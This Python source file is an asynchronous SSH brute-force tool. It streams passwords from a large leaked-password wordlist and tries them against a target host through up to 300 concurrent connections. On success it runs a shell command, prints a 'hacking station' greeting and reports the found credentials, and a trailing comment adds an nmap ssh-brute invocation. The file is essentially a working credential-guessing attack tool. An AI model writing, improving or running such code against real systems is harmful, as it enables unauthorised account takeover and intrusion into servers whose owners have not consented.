import atexit
import os
import time
import uvloop
import asyncio, asyncssh, aiofiles, aiocsv
from pprint import pprint
from concurrent.futures import ThreadPoolExecutor
from random import random

Username = ''
Password: str = ''
Host: str = ''
Port: int = -1
reset: str = "\033[m"
start: float = 0


def goodbye():
    if not os.path.exists('debug'):
        os.makedirs('debug')
    elapsed = time.perf_counter() - start
    if Password != '':
        s = f"""
        \33[1;32;1m
        PASSWORD FOUND !!!
        Username: {Username}
        Password: {Password}
        Host: {Host}\t Port: {Port}
        
        Total time: {time.strftime("%Hh %Mm %Ss", time.gmtime(elapsed))}
        {reset}
        """
        print(s)
    else:
        s = f"""
        \33[1;31;1m
        PASSWORD NOT FOUND :(

        Total time: {time.strftime("%Hh %Mm %Ss", time.gmtime(elapsed))}
        {reset}
        """
        print(s)

class BruteForceSSH:
    uvloop.install()
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    
    def __init__(self, 
                    user: str, 
                    host: str, 
                    port: int, 
                    file: str, 
                    mode: int, 
                    sem: int, 
                    max_workers: int, 
                    max_retries: int, 
                    asleep: float,
                    verbose: bool,
                    quiet: bool
                ):
        
        global start, Username
        
        Username = user
        start = time.perf_counter()
        
        self.host: str = host
        self.port: int = port
        self.file: str = file
        self.user: str = user
        self.mode: int = mode
        self.sem: int = sem
        self.max_workers: int = max_workers
        self.asleep: float = asleep
        self.max_retries: int = max_retries
        self.verbose: bool = verbose
        self.quiet: bool = quiet
        
        # start to measure execution wall time
        self.start: float = time.perf_counter()
        
        # auxiliary variables to keep track of requests (made / not made)
        self.failed: int = 0
        self.checked: int = 0
        self.tot_password: int = 0
        
        # store unsent attempts caused by some error
        self.lost_attempt: set = set()
        
    def print_stdout(self, *args): 
        if self.verbose:
            print(f"\33[1;31;46mpassword read from file: {args[0]}    Still Remain: {self.tot_password - self.checked}    Checked: {self.checked}    Failed: {self.failed} Elapsed: {time.strftime('%Hh %Mm %Ss', time.gmtime(time.perf_counter() - self.start))}", reset)
            print(*args[1:], reset)
        elif self.quiet:
            print(f"\33[1;31;46m Processed: {self.checked} on {args[0]}", reset)
        else:
            print(f"\33[1;31;46mpassword read from file: {args[0]}    Still Remain: {self.tot_password - self.checked}    Checked: {self.checked}    Failed: {self.failed}", reset)
    
    def run(self):
        atexit.register(goodbye)
        if self.max_workers:
            asyncio.run(self.main_thread_pool())
        else:
            asyncio.run(self.main())

    def run_thread_pool(self, password: str, nostop: bool = False):
            uvloop.install()
            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
            
            loop: asyncio.AbstractEventLoop = asyncio.new_event_loop()
            try:
                # asyncio.set_event_loop(loop)
                asyncio.run(self.brute(password, nostop))
            except Exception as e:
                print(e.__class__)
            finally:
                loop.close()

    # ================================ Async Functions ================================ #
        
    # ------------------------------ Perform SSH request to find out Password ------------------------------ #
    async def brute(self, password: str, nostop: bool = False, command: str = '\nls -la ; echo "\nHello from ur new hacking station :)\n"'):
        i = 0
        while nostop or i <= self.max_retries:
            await asyncio.sleep(random() * self.asleep)
            try:
                async with asyncssh.connect(self.host, username=self.user, password=password, port=self.port, known_hosts=None, keepalive_interval=100) as conn:
                    success = await conn.run(command)
                    global Password, Host, Port
                    Password = password
                    Host = self.host
                    Port = self.port
                    self.print_stdout(self.tot_password, f"\33[1;30;1mattempt nr {i}", f"\33[1;32;1m[Password Found]\tUsername: {self.user}, Password: {password}")
                    self.print_stdout(self.tot_password, f"\33[1;32;1m{success.stdout}")
                    exit(0)
            except asyncssh.PermissionDenied as e:
                self.print_stdout(self.tot_password, f"\33[1;30;1mattempt nr {i}", "\33[1;33;1m[Password Not Found]\t", f"\33[1;37;1mUsername: {self.user}, Password: {password}\t", f"\33[1;31;1m{e} --> {e.__class__}")
                try:
                    self.lost_attempt.remove(password)
                except KeyError as k:
                    pass
                self.checked += 1
                self.failed -= 1
                return
            except asyncssh.ConnectionLost as e:
                self.print_stdout(self.tot_password, f"\33[1;30;1mattempt nr {i}", "\33[1;34;1m[Connection Refused]\t", f"\33[1;37;1mUsername: {self.user}, Password: {password}\t", f"\33[1;31;1m{e} --> {e.__class__}")
                if i == 0:
                    self.lost_attempt.add(password)
                    self.failed += 1
            except Exception as e:
                self.print_stdout(self.tot_password, f"\33[1;30;1mattempt nr {i}", "\33[1;35;1m[Connection Reset]\t", f"\33[1;37;1mUsername: {self.user}, Password: {password}\t", f"\33[1;31;1m{e} --> {e.__class__}")
                if i == 0:
                    self.lost_attempt.add(password)
                    self.failed += 1
            i += 1
        return 

    # ------------------------------ Perform request with sem ------------------------------ #
    async def brute_with_sem(self, password: str, sem: asyncio.Semaphore, nostop: bool = False):
        async with sem:
            await self.brute(password, nostop)

    # ------------------------------ Create Read from file Courutines ------------------------------ #
    async def read_file(self):
        i: int = 1
        lenght: int = len(self.file)
        index: int = self.file.rfind(".", lenght // 2, lenght)
        file_ext: str = self.file[index:]
        async with aiofiles.open(self.file, mode="r", encoding="utf-8", newline="") as f:
            async for row in aiocsv.AsyncReader(f):
                if len(self.lost_attempt) > 20000:
                    copy_set = self.lost_attempt.copy()
                    pop_set = 0
                    while pop_set < 7000:
                        print("Yelded from set hope it will decrease memory !!!", reset)
                        yield copy_set.pop(), i + pop_set
                        pop_set += 1
                    del copy_set
                elif (file_ext == '.csv'):
                    yield repr(row[1])[1:-1], i
                else:
                    yield repr(row[0])[1:-1], i
                self.tot_password = i
                i += 1

    # ------------------------------ Test all passwords in a file ------------------------------ #
    async def main(self):
        self.print_stdout(f"\n\nprogram start with:\n\nHost --> {self.host}\nPort --> {self.port}\nFile --> {self.file}\n")
        sem: asyncio.Semaphore = asyncio.Semaphore(self.sem)
        if self.mode == 1:
            tasks: list =  [
                    asyncio.create_task(self.brute_with_sem(passw, sem)) 
                    async for passw, _ in self.read_file()
                ]
            # await asyncio.gather(*tasks, return_exceptions=True)
        else:
            tasks = []
            add = tasks.append
            async for passw, i in self.read_file():
                # Riga cambiata per test Rockyou2021
                if i % 10000 == 1:
                # if i % self.sem == 1:
                    [await task for task in tasks]
                    tasks = [asyncio.ensure_future(self.brute_with_sem(passw, sem))]
                if self.mode == 2:
                    add(asyncio.ensure_future(self.brute_with_sem(passw, sem)))
                elif self.mode == 3:
                    add(asyncio.ensure_future(self.brute_with_sem(passw, sem, True)))
            [await task for task in tasks]
            del tasks
        # perform the unsent remaining requests 
        while (len(self.lost_attempt) > 0):
            copy_set: set = self.lost_attempt.copy()
            self.failed = 0
            tasks: list = [
                    asyncio.create_task(self.brute_with_sem(passw, sem)) 
                    for passw in copy_set
                ]
            await asyncio.gather(*tasks, return_exceptions=True)


    async def main_thread_pool(self):
        self.print_stdout(f"\n\nprogram start with:\n\nHost --> {self.host}\nPort --> {self.port}\nFile --> {self.file}\n")
        with ThreadPoolExecutor(max_workers=self.max_workers) as pool:
            loop: asyncio.AbstractEventLoop = asyncio.get_running_loop()
            if self.mode == 1:
                tasks: list = [
                    loop.run_in_executor(pool, self.run_thread_pool, passw)
                    async for passw, _ in self.read_file()
                ]
                await asyncio.gather(*tasks, return_exceptions=True)
            else:
                tasks = []
                add = tasks.append
                async for passw, i in self.read_file():
                    if i % self.max_workers == 1:
                        [await task for task in tasks]
                        tasks = [loop.run_in_executor(pool, self.run_thread_pool, passw)]
                    if self.mode == 2:
                        add(loop.run_in_executor(pool, self.run_thread_pool, passw))
                    elif self.mode == 3:
                        add(loop.run_in_executor(pool, self.run_thread_pool, passw, True))
                [await task for task in tasks]
                del tasks
            
            # perform the unsent remaining requests 
            while (len(self.lost_attempt) > 0):
                copy_set: set = self.lost_attempt.copy()
                self.failed = 0
                tasks: list = [
                        loop.run_in_executor(pool, self.run_thread_pool, passw)
                        for passw in copy_set
                    ]
                await asyncio.gather(*tasks, return_exceptions=True)
        return




if __name__ == '__main__':
    start: float = time.perf_counter()

    b = BruteForceSSH(
        user='fede',
        host='192.168.0.212',
        port=4242,
        file='/Users/federikowsky/Desktop/.mylib/wordlist/rockyou2021.txt',
        mode=1,
        sem=300,
        max_workers=0,
        max_retries=1,
        asleep=0,
        verbose=True,
        quiet=False
    )
    res = asyncio.run(b.run())
    
    print(time.perf_counter() - start)




# nmap -p 22 --script ssh-brute --script-args userdb=/Users/federikowsky/Desktop/MyProjects/Python/BruteForce/wordlist/user.txt,unpwdb.timelimit=0,passdb=/Users/federikowsky/Desktop/MyProjects/Python/BruteForce/wordlist/150.txt,ssh-brute.timeout=0s,ssh-brute.start=1000,self-brute.threads=1000,self-brute.firstonly=True localhost